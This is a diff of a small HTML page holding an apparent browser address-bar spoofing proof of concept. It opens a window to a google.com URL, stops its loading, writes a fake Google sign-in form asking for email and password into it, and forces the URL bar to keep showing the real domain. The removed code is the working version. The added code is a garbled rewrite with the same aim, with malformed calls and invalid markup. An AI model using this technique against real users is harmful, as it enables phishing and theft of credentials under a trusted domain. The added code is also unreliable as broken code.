@@ -1,58 +1,23 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="spoof()">CLICK TO DEMO</button>
-
+<button onclick="testRedirect()">CLICK </button>
 <script>
-function spoof() {
-
-    // 1) open target domain
-    let win = window.open("https://www.google.com:8080/", "_blank");
-
-    // 2) spam stop while early loading
-    let killer = setInterval(()=>{
-        try { win.stop(); } catch(e){}
-    }, 30);
-
-    // 3) inject fake UI slightly delayed
-    setTimeout(()=>{
-        try{
-            win.document.open();
-            win.document.write(
-                <div style="text-align:center;font-family:Arial;margin-top:50px;">
-                    <img src="https://www.google.com:8080/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" height="60">
-                    <h2>Sign in</h2>
-                    <input placeholder="Email"><br><br>
-                    <input type="password" placeholder="Password"><br><br>
-                    <button>Login</button>
-                    <p style="color:red;">(Fake Page)</p>
-                </div>
-            );
-            win.document.close();
-        }catch(e){}
-    }, 90);
-
-    // 4) delayed location replace to enforce URL bar
-    setTimeout(()=>{
-        try {
-            win.location.replace("https://www.google.com:8080");
-        }catch(e){}
-    }, 300);
-
-    // 5) continuous override fallback
-    let fallback = setInterval(()=>{
-        try{
-            win.location.replace("https://www.google.com:8080");
-            win.stop();
-        }catch(e){}
-    }, 120);
-
-    // 6) auto cleanup after 6s (optional)
-    setTimeout(()=>{
-        clearInterval(killer);
-        clearInterval(fallback);
-    }, 6000);
-
+function testRedirect() {
+    let win = window.open("https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000");
+    let payload = '<div style="text-align:center; font-family:Arial, sans-serif;">' +
+        '<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">' +
+        '<h1>This is NOT Google!</h1>' +
+        '<p>Please enter your credentials:</p>' +
+        '<input>email</input>' +
+        '<input>password</input>' +
+        '</div>';
+    win.document.write(payload);
+    win.document.close();
+    win.location.replace("https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000");
+    setInterval(function() {
+        win.stop(win);
+    }, 10);  // Small interval to preserve the spoof
 }
 </script>
 </body>
